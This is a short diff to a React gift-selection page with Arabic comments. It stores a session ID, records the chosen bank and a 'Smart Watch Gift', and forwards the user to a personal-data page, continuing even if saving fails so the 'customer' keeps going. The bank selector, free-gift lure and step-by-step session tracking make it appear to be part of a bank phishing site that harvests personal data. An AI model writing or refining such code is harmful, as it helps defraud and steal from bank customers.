@@ -39,20 +39,17 @@ export default function GiftSelection() {
     localStorage.setItem("selectedGift", id.toString());
     
     try {
+      const currentSessionId = session || localStorage.getItem("sessionId") || "";
+      
       // تحديث الجلسة والانتظار لضمان الحفظ قبل الانتقال
       await createSessionMutation.mutateAsync({
-        sessionId: session,
+        sessionId: currentSessionId,
         selectedBank: bank,
         selectedGift: `Smart Watch Gift #${id}`
       });
       
-      await reportStepMutation.mutateAsync({
-        sessionId: session,
-        step: "personal-data"
-      });
-
       // الانتقال بعد التأكد من الحفظ
-      setLocation(`/personal-data?bank=${bank}&session=${session}&gift=${id}`);
+      setLocation(`/personal-data?bank=${bank}&session=${currentSessionId}&gift=${id}`);
     } catch (error) {
       console.error("Error updating session with gift:", error);
       // انتقال احتياطي حتى لو فشل التحديث لضمان عدم توقف العميل
